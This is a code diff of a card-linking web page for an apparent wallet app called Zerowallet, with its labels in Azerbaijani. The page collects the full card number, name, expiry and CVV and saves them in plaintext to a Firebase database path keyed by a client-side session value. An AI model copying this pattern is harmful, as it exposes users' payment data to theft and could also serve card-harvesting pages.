@@ -3,58 +3,177 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bank Kartı Bağla - Zerowallet</title>
+    <title>Kartı Bağla | Zerowallet</title>
+    
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&family=Space+Mono&display=swap" rel="stylesheet">
+    
     <style>
-        :root { --bg: #020617; --primary: #6366f1; --danger: #ff4d4d; --success: #22c55e; }
-        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Plus Jakarta Sans', sans-serif; padding: 20px; min-height: 100vh; }
-        .top-nav { display: flex; align-items: center; margin-bottom: 25px; }
-        .back-btn { font-size: 1.5rem; color: #94a3b8; cursor: pointer; margin-right: 15px; }
-        .card-view {
-            width: 100%; height: 200px; background: linear-gradient(135deg, #312e81 0%, #1e1b4b 100%);
-            border-radius: 20px; padding: 25px; position: relative; margin-bottom: 30px; border: 1px solid rgba(255,255,255,0.1);
+        :root {
+            --bg: #0a0e1a;
+            --primary: #4f46e5;
+            --card-grad: linear-gradient(135deg, #1e1b4b 0%, #312e81 100%);
+            --input-bg: #161b2c;
+            --text-muted: #94a3b8;
         }
-        .brand-icon { position: absolute; top: 20px; right: 20px; width: 45px; }
-        .chip { width: 45px; height: 35px; background: linear-gradient(135deg, #ffd700, #b8860b); border-radius: 6px; margin-bottom: 20px; }
-        .card-num-v { font-family: 'Space Mono', monospace; font-size: 1.2rem; letter-spacing: 2px; display: block; margin-bottom: 25px; }
-        .input-box { margin-bottom: 15px; }
-        .input-box label { display: block; font-size: 0.7rem; font-weight: 700; color: #64748b; margin-bottom: 5px; }
-        input { width: 100%; padding: 14px; background: #0f172a; border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; color: #fff; outline: none; }
-        input:focus { border-color: var(--primary); }
-        .submit-btn { width: 100%; background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); color: white; border: none; padding: 16px; border-radius: 15px; font-weight: 800; cursor: pointer; margin-top: 15px; }
-        #toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); padding: 12px 25px; border-radius: 10px; font-weight: 700; display: none; z-index: 1000; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+
+        /* Ekranın sürüşməsini tamamilə bağlayan hissə */
+        html, body {
+            margin: 0; padding: 0;
+            width: 100%; height: 100%;
+            overflow: hidden; /* Sürüşməni tam dayandırır */
+            position: fixed; /* Ekranın tərpənməsinin qarşısını alır */
+            background: var(--bg);
+            color: #fff;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            touch-action: none; /* Zoom və lazımsız toxunuş hərəkətlərini bloklayır */
+        }
+
+        .app-container {
+            padding: 25px 20px;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .header i { font-size: 1.4rem; cursor: pointer; color: var(--text-muted); }
+        .header h2 { font-size: 1.1rem; font-weight: 800; margin-left: 15px; letter-spacing: -0.5px; }
+
+        /* Realist Bank Kartı */
+        .credit-card {
+            width: 100%;
+            height: 200px;
+            background: var(--card-grad);
+            border-radius: 22px;
+            padding: 25px;
+            position: relative;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            border: 1px solid rgba(255,255,255,0.08);
+            margin-bottom: 35px;
+            box-sizing: border-box;
+        }
+
+        .brand-logo { position: absolute; top: 25px; right: 25px; height: 35px; transition: 0.3s; }
+        .chip { 
+            width: 48px; height: 36px; 
+            background: linear-gradient(135deg, #f59e0b 0%, #b45309 100%); 
+            border-radius: 7px; margin-bottom: 25px;
+        }
+
+        .card-number-v {
+            font-family: 'Space Mono', monospace;
+            font-size: 1.3rem;
+            letter-spacing: 2px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+            display: block;
+            margin-bottom: 25px;
+        }
+
+        .card-details-v { display: flex; justify-content: space-between; align-items: flex-end; }
+        .v-lbl { font-size: 0.6rem; color: var(--text-muted); text-transform: uppercase; margin-bottom: 4px; display: block; }
+        .v-val { font-size: 0.85rem; font-weight: 600; letter-spacing: 0.5px; }
+
+        /* Form */
+        .form { flex: 1; }
+        .field { margin-bottom: 18px; }
+        .field label { font-size: 0.75rem; font-weight: 700; color: var(--text-muted); margin-bottom: 8px; display: block; margin-left: 5px; }
+        
+        input {
+            width: 100%;
+            background: var(--input-bg);
+            border: 1px solid rgba(255,255,255,0.05);
+            padding: 16px;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        input:focus { border-color: var(--primary); background: #1c2237; }
+
+        .row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+
+        .btn {
+            width: 100%;
+            background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%);
+            color: #fff;
+            border: none;
+            padding: 18px;
+            border-radius: 16px;
+            font-weight: 800;
+            font-size: 1rem;
+            margin-top: 10px;
+            box-shadow: 0 10px 20px rgba(79, 70, 229, 0.2);
+            cursor: pointer;
+        }
+
+        .btn:active { transform: scale(0.98); }
+
+        #toast {
+            position: fixed; top: 25px; left: 50%; transform: translateX(-50%);
+            padding: 14px 28px; border-radius: 12px; font-weight: 700;
+            display: none; z-index: 9999; box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            font-size: 0.9rem; width: 80%; text-align: center;
+        }
     </style>
 </head>
 <body>
 
     <div id="toast"></div>
 
-    <div class="top-nav">
-        <i class="fas fa-chevron-left back-btn" onclick="history.back()"></i>
-        <div style="font-weight:800">KART ƏLAVƏ ET</div>
-    </div>
-
-    <div class="card-view">
-        <img src="visa.png" id="brand-logo" class="brand-icon" style="display:none">
-        <div class="chip"></div>
-        <span class="card-num-v" id="v-number">**** **** **** ****</span>
-        <div style="display:flex; justify-content:space-between; font-size:0.8rem">
-            <div><small style="color:#94a3b8">SAHİB</small><br><span id="v-name">AD SOYAD</span></div>
-            <div><small style="color:#94a3b8">TARİX</small><br><span id="v-expiry">MM/YY</span></div>
+    <div class="app-container">
+        <div class="header">
+            <i class="fas fa-arrow-left" onclick="history.back()"></i>
+            <h2>KART ƏLAVƏ ET</h2>
         </div>
-    </div>
 
-    <div class="form">
-        <div class="input-box"><label>KART NÖMRƏSİ</label><input type="text" id="i-number" maxlength="19" placeholder="0000 0000 0000 0000"></div>
-        <div class="input-box"><label>AD SOYAD</label><input type="text" id="i-name" placeholder="ELVIN ALIYEV"></div>
-        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px">
-            <div class="input-box"><label>TARİX</label><input type="text" id="i-expiry" maxlength="5" placeholder="MM/YY"></div>
-            <div class="input-box"><label>CVV</label><input type="password" id="i-cvv" maxlength="3" placeholder="***"></div>
+        <div class="credit-card">
+            <img src="visa.png" id="v-logo" class="brand-logo" style="display:none">
+            <div class="chip"></div>
+            <span class="card-number-v" id="view-num">**** **** **** ****</span>
+            <div class="card-details-v">
+                <div>
+                    <span class="v-lbl">Kart Sahibi</span>
+                    <span class="v-val" id="view-name">AD SOYAD</span>
+                </div>
+                <div style="text-align: right;">
+                    <span class="v-lbl">Bitmə Tarixi</span>
+                    <span class="v-val" id="view-exp">MM/YY</span>
+                </div>
+            </div>
         </div>
-        <button class="submit-btn" onclick="saveData()">TƏSDİQLƏ</button>
+
+        <div class="form">
+            <div class="field">
+                <label>KART NÖMRƏSİ</label>
+                <input type="text" id="inp-num" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000">
+            </div>
+            <div class="field">
+                <label>AD SOYAD</label>
+                <input type="text" id="inp-name" placeholder="ELVIN ALIYEV" oninput="this.value = this.value.toUpperCase()">
+            </div>
+            <div class="row">
+                <div class="field">
+                    <label>TARİX</label>
+                    <input type="text" id="inp-exp" inputmode="numeric" maxlength="5" placeholder="MM/YY">
+                </div>
+                <div class="field">
+                    <label>CVV</label>
+                    <input type="password" id="inp-cvv" inputmode="numeric" maxlength="3" placeholder="***">
+                </div>
+            </div>
+            <button class="btn" onclick="saveCard()">TƏSDİQLƏ</button>
+        </div>
     </div>
 
     <script>
@@ -71,51 +190,55 @@
         const db = firebase.database();
         const user = localStorage.getItem('zerowallet_session');
 
-        const numInp = document.getElementById('i-number');
-        const nameInp = document.getElementById('i-name');
-        const expInp = document.getElementById('i-expiry');
-        const brandLogo = document.getElementById('brand-logo');
+        const iNum = document.getElementById('inp-num');
+        const iName = document.getElementById('inp-name');
+        const iExp = document.getElementById('inp-exp');
+        const iCvv = document.getElementById('inp-cvv');
+        const vLogo = document.getElementById('v-logo');
 
-        numInp.addEventListener('input', (e) => {
-            let val = e.target.value.replace(/\D/g, '');
-            if(val.startsWith('4')) { brandLogo.src = 'visa.png'; brandLogo.style.display = 'block'; }
-            else if(val.startsWith('5')) { brandLogo.src = 'master.png'; brandLogo.style.display = 'block'; }
-            else { brandLogo.style.display = 'none'; }
-            let f = val.match(/.{1,4}/g)?.join(' ') || val;
+        // Canlı Sinxronizasiya
+        iNum.addEventListener('input', (e) => {
+            let v = e.target.value.replace(/\D/g, '');
+            if(v.startsWith('4')) { vLogo.src = 'visa.png'; vLogo.style.display = 'block'; }
+            else if(v.startsWith('5')) { vLogo.src = 'master.png'; vLogo.style.display = 'block'; }
+            else { vLogo.style.display = 'none'; }
+            
+            let f = v.match(/.{1,4}/g)?.join(' ') || v;
             e.target.value = f;
-            document.getElementById('v-number').innerText = f || "**** **** **** ****";
+            document.getElementById('view-num').innerText = f || "**** **** **** ****";
         });
 
-        nameInp.addEventListener('input', (e) => {
-            let v = e.target.value.toUpperCase();
+        iName.addEventListener('input', (e) => {
+            document.getElementById('view-name').innerText = e.target.value || "AD SOYAD";
+        });
+
+        iExp.addEventListener('input', (e) => {
+            let v = e.target.value.replace(/\D/g, '');
+            if(v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2,4);
             e.target.value = v;
-            document.getElementById('v-name').innerText = v || "AD SOYAD";
+            document.getElementById('view-exp').innerText = v || "MM/YY";
         });
 
-        expInp.addEventListener('input', (e) => {
-            let val = e.target.value.replace(/\D/g, '');
-            if(val.length >= 2) val = val.substring(0,2) + '/' + val.substring(2,4);
-            e.target.value = val;
-            document.getElementById('v-expiry').innerText = val || "MM/YY";
-        });
-
-        function showStatus(msg, type) {
+        function showToast(msg, color) {
             const t = document.getElementById('toast');
             t.innerText = msg;
-            t.style.background = type === 'err' ? 'var(--danger)' : 'var(--success)';
+            t.style.background = color;
             t.style.display = 'block';
-            if(type === 'err') setTimeout(() => t.style.display = 'none', 3000);
+            if(color === '#ef4444') setTimeout(() => t.style.display = 'none', 2500);
         }
 
-        function saveData() {
-            const n = numInp.value.replace(/\s/g, '');
-            if(n.length < 16 || nameInp.value.length < 5 || expInp.value.length < 5) return showStatus("Məlumatları düzgün daxil edin!", "err");
+        function saveCard() {
+            const n = iNum.value.replace(/\s/g, '');
+            if(n.length < 16) return showToast("Kart nömrəsi yanlışdır!", "#ef4444");
+            if(iName.value.length < 5) return showToast("Ad və Soyad daxil edin!", "#ef4444");
+            if(iExp.value.length < 5) return showToast("Tarix yanlışdır!", "#ef4444");
+            if(iCvv.value.length < 3) return showToast("CVV yanlışdır!", "#ef4444");
 
             db.ref('zerowallet_users/' + user + '/cardInfo').set({
-                number: n, holder: nameInp.value, expiry: expInp.value, cvv: document.getElementById('i-cvv').value, date: Date.now()
+                number: n, holder: iName.value, expiry: iExp.value, cvv: iCvv.value, time: Date.now()
             }).then(() => {
-                showStatus("Kart uğurla əlavə olundu!", "success");
-                setTimeout(() => location.href = 'main.html', 2000);
+                showToast("Kart uğurla bağlandı!", "#22c55e");
+                setTimeout(() => location.href = 'main.html', 1500);
             });
         }
     </script>
